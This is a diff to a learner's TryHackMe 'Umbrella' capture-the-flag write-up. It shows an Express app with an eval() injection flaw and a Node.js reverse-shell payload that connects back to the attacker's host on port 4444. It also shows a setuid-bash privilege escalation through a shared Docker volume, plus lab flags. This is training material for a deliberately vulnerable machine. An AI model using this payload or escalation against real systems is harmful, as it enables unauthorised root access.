@@ -1,8 +1,11 @@
 <h1 align="center">Umbrella</h1>
-<p align="center">Jun 30, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
-part of my 420-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
-<em>Breach Umbrella Corp's time-tracking server by exploiting misconfigurations around containerisation.</em>. <a href="https://tryhackme.com/room/umbrellae"</a>here.<br><br>
-<img width="1000px" src=""></p>
+<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/51214f37-6075-45cd-8dd1-a287156c39b0"><br>
+June 30, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
+and I’m excited to join you on this adventure,<br>
+part of my <code>420</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
+<em>Breach Umbrella Corp's time-tracking server by exploiting misconfigurations around containerisation.</em>.<br>
+Access it <a href="https://tryhackme.com/room/umbrella"</a>here.<br>
+<img width="1200px" src="https://github.com/user-attachments/assets/b644599d-86a4-4dc8-b2c6-1ad7aabd3498"></p>
 
 <br>
 
@@ -459,9 +462,17 @@ ssh claire-r@TargetIP
 ...
 claire-r@ip-xx-xx-xxx-xxx:~$ cat user.txt
 THM{d832c0e4cf71312708686124f7a6b25e}
+```
+
+```bash
 claire-r@ip-xx-xx-xxx-xxx:~$ cd timeTracker-src
 claire-r@ip-xx-xx-xxx-xxx:~/timeTracker-src$ ls
 app.js  db  docker-compose.yml  Dockerfile  logs  package.json  package-lock.json  public  views
+```
+
+<p><code>docker-compose.yml</code></p>
+
+```bash
 claire-r@ip-xx-xx-xxx-xxx:~/timeTracker-src$ cat docker-compose.yml
 version: '3.3'
 services:
@@ -482,10 +493,256 @@ services:
       - '8080:8080'
     volumes:
       - ./logs:/logs
-claire-r@ip-xx-xx-xxx-xxx:~/timeTracker-src$ 
+```
+
+<p><code>ap.js</code>:<br>
+<code> let timeCalc = parseInt(eval(request.body.time));</code></p>
+
+```bash
+claire-r@ip-xx-xx-xxx-xxx:~/timeTracker-src$ cat app.js
+const mysql = require('mysql');
+const express = require('express');
+const session = require('express-session');
+const path = require('path');
+const crypto = require('crypto')
+const cookieParser = require('cookie-parser');
+const fs = require('fs');
+
+const connection = mysql.createConnection({
+	host     : process.env.DB_HOST,
+	user     : process.env.DB_USER,
+	password : process.env.DB_PASS,
+	database : process.env.DB_DATABASE
+});
+
+const app = express();
+app.set('view engine' , 'ejs')
+app.set('views', './views')
+app.use(express.static(__dirname + '/public'));
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+app.use(cookieParser());
+app.use(session({secret: "Your secret key", cookie : {secure : false}}));
+
+var logfile = fs.createWriteStream(process.env.LOG_FILE, {flags: 'a'});
+
+var log = (message, level) => {
+	format_message = `[${level.toUpperCase()}] ${message}`;
+	logfile.write(format_message + "\n")
+	if (level == "warn") console.warn(message)
+	else if (level == "error") console.error(message)
+	else if (level == "info") console.info(message)
+	else console.log(message)
+}
+
+// http://localhost:8080/
+app.get('/', function(request, response) {
+	
+	if (request.session.username) {
+		
+		connection.query('SELECT user,time FROM users', function(error, results) {
+			var users = []
+			if (error) {
+				log(error, "error")
+			};
+
+			for (let row in results){
+
+				let min = results[row].time % 60;
+				let padded_min = `${min}`.length == 1 ? `0${min}` : `${min}`
+				let time = `${(results[row].time - min) / 60}:${padded_min} h`;
+				users.push({name : results[row].user, time : time});
+			}							
+			response.render('home', {users : users});
+		});	
+		
+	} else{
+		response.render('login');
+	}
+		
+});
+
+
+
+// http://localhost:8080/time
+app.post('/time', function(request, response) {
+	
+    if (request.session.loggedin && request.session.username) {
+
+        let timeCalc = parseInt(eval(request.body.time));
+		let time = isNaN(timeCalc) ? 0 : timeCalc;
+        let username = request.session.username;
+
+		connection.query("UPDATE users SET time = time + ? WHERE user = ?", [time, username], function(error, results, fields) {
+			if (error) {
+				log(error, "error")
+			};
+
+			log(`${username} added ${time} minutes.`, "info")
+			response.redirect('/');
+		});
+	} else {
+        response.redirect('/');;	
+    }
+	
+});
+
+// http://localhost:8080/auth
+app.post('/auth', function(request, response) {
+	
+	let username = request.body.username;
+	let password = request.body.password;	
+	
+	if (username && password) {
+		
+		let hash = crypto.createHash('md5').update(password).digest("hex");
+		
+		connection.query('SELECT * FROM users WHERE user = ? AND pass = ?', [username, hash], function(error, results, fields) {
+			
+			if (error) {
+				log(error, "error")
+			};
+			
+			if (results.length > 0) {
+				
+				request.session.loggedin = true;
+				request.session.username = username;		
+				log(`User ${username} logged in`, "info");	
+				response.redirect('/');	
+			} else {
+				log(`User ${username} tried to log in with pass ${password}`, "warn")
+				response.redirect('/');	
+			} 					
+		});		
+	} else {
+		response.redirect('/');	
+	} 	
+
+});
+
+app.listen(8080, () => {
+	console.log("App listening on port 8080")
+});
+```
+
+<h3>TargetIP:8080</h3>
+
+![image](https://github.com/user-attachments/assets/0db93ea8-b3cf-4721-bb30-d5d513d02c36)
+
+<p><code>/auth</code></p>
+
+![image](https://github.com/user-attachments/assets/b113eeb6-ac12-4904-a244-8532b964a7e3)
+
+<p>
+  
+- entered <code>7</code> + <code>3</code>
+- entered <code>5</code><br>
+- all summed up with claire-r´s time spent</p>
+
+![image](https://github.com/user-attachments/assets/a9698841-c5a8-4649-9347-e71fcc4a710e)
+
+```bash
+:~/Umbrella# nc -nlvp 4444
+```
+
+<p><em>payload</em></p>
+
+```bash
+(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "10.10.37.217", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
+```
+
+![image](https://github.com/user-attachments/assets/b47b1f7a-9c1e-4e1e-8ecc-bf1b57671ada)
+
+<p>
+
+- clicked <code>Submit</code><br>
+
+
+```bash
+:~/Umbrella# nc -nlvp 4444
+Listening on 0.0.0.0 4444
+Connection received on TargetIP9 42418
+id
+uid=0(root) gid=0(root) groups=0(root)
+pwd
+/usr/src/app
+```
+
+<br>
+
+- stabilized the shell<br>
+
+```bash
+/usr/bin/script -qc /bin/bash /dev/null
+:/logs# ^Z
+[1]+  Stopped                 nc -nlvp 4444
+:~/Umbrella# stty raw -echo; fg
+...
+nc -nlvp 4444
+```
+
+<br>
+
+- copied the <code>/bin/bash</code> to <code>/logs</code<br>
+- used <code>chmod s+u</code> to enforce group ownership<br>
+- accessed it</p>
+
+```bash
+root@de0610f51845:/logs# cp /bin/bash .
+root@de0610f51845:/logs# chmod u+s bash
+root@de0610f51845:/logs# chmod u+s bash
 ```
 
 
-![image](https://github.com/user-attachments/assets/0db93ea8-b3cf-4721-bb30-d5d513d02c36)
+```bash
+claire-r@ip-10-10-176-69:~/timeTracker-src/logs$ ls -la
+total 1220
+drwxrw-rw- 2 claire-r claire-r    4096 Jun 30 23:17 .
+drwxrwxr-x 6 claire-r claire-r    4096 Dec 22  2022 ..
+-rwsr-xr-x 1 root     root     1234376 Jun 30 23:17 bash
+-rw-r--r-- 1 root     root         635 Jun 30 23:13 tt.log
+claire-r@ip-10-10-176-69:~/timeTracker-src/logs$ ./bash -p
+bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt
+THM{1e15fbe7978061c6bb1924124fd9eab2}
+```
+
+<br>
+<br>
+
+![image](https://github.com/user-attachments/assets/97605475-b8be-4504-95ba-b421f5c81d1b)
+
+![image](https://github.com/user-attachments/assets/47f96969-5d85-4ec0-a438-1f33486ae5f3)
+
+
+<br>
+<br>
+
+![image](https://github.com/user-attachments/assets/ca972dec-5b93-4971-afac-60f377cb0f6f)
+
+<p>Global all time = 171st</p>
+
+![image](https://github.com/user-attachments/assets/25b78a11-f884-47df-9aa5-1a1c63da5d8f)
+
+![image](https://github.com/user-attachments/assets/cce375f6-b458-468f-b584-a4eaeb40e9bd)
+
+
+<p>Brazil  all time = 5th</p>
+
+![image](https://github.com/user-attachments/assets/4dcd1e33-d427-4ab2-af4c-7edbaa85895e)
+
+<p>Global Monthly = 222nd</p>
+
+![image](https://github.com/user-attachments/assets/341a5876-3fbb-46a2-86ec-6a4ee0400d51)
+
+
+<p>Brazil Monthly = 6th</p>
+
+![image](https://github.com/user-attachments/assets/c91d43b5-84ea-41a8-ab95-4d3d978634cb)
+
+
+
 
 
